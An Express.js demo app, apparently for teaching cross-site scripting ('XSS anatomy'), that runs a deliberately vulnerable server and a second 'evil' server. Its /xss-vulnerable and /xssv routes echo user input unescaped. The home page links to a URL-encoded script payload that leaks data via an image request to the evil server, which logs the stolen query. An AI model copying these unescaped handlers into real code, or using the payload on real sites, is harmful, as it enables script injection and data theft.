const express = require('express')
const app = express()
const path = require("path");
const anotherApp = express()
const bodyParser = require("body-parser");
const port = 3000
const anotherPort = 3001

app.use(bodyParser.urlencoded({ extended: false }));
app.use(bodyParser.json());

function setCSP(res) {
  res.setHeader("Content-Security-Policy", "img-src 'self'");
}

//app.get('/', (req, res) => res.send('<body><p>Hello World! <p><form action=/xssv method=POST><input name=xss><input type=submit name="send"><form>'));
app.get('/', (req, res) => {
  setCSP(res);
  res.send(`
    <html>
    <head>
    <script src="jquery/dist/jquery.min.js"></script>
    <script>
    function doCrossDomainCall() {
      $.getJSON( "http://localhost:3001/some", function( data ) {
        $("#p1").text( "got message: " + data.message );
      });
    }
    function doSameDomainCall() {
      $.getJSON( "/some", function( data ) {
        $("#p1").text ( "got message: " + data.message );
      });
    }
    </script>
    </head>
    <body>
    </body>
    <h1>XSS anatomy<h1>
    <h2>Cross domain js</h2>
    <div id="p1"></div>
    <p>
    <input type="button" value="Another domain" onClick="doCrossDomainCall()">
    <p>
    <input type="button" value="Same domain" onClick="doSameDomainCall()">
    <p>
    <h3>Do you want to go:
    <a href="http://localhost:3000/xss-vulnerable?xss=%3Cscript%3Evar%20img%20=%20document.createElement(%22img%22);img.src%20=%20%22http://localhost:3001/xss.jpeg?sending-some-data-from-JS%22;document.getElementsByTagName(%22body%22)[0].appendChild(img);%3C/script%3E">here</a>
    </html>
    `);
});
app.get('/xss-vulnerable', (req, res) => {
  setCSP(res);
  res.send('<html><body><p>Hello World from vulnerable XSS service: !<p>' + req.query.xss);
});

//app.get('/xssv', (req, res) => res.send('<html><body><p>Hello World from vulnerable XSS service: !<p><script>alert("zaza");</script>'));

app.get("/some", (req, res) => {
  res.setHeader('Content-Type', 'application/json');
  res.send(JSON.stringify({ message: 'Hello from svc ' + port }));
});

app.post('/xssv', (req, res) => (
  res.send('<html><body><p>Hello. You sent: ' + req.body.xss.replace(/ico/, "icozaza"))
));

app.use(express.static('app-static'));
app.use(express.static('node_modules'));

app.listen(port, () => console.log(`Example app listening on port ${port}!`))

anotherApp.get("/some", (req, res) => {
  res.setHeader('Content-Type', 'application/json');
  res.send(JSON.stringify({ message: 'Hello from evil svc ' + anotherPort }));
});

anotherApp.use(function (req, res, next) {
  var filename = path.basename(req.url);
  if(filename.startsWith('xss.jpeg'))
    console.log("The file " + filename + " was requested with query: ", req.query);
  next();
});
anotherApp.use(express.static('another-static'));

anotherApp.listen(anotherPort, () => console.log(`Another app listening on port ${anotherPort}!`))

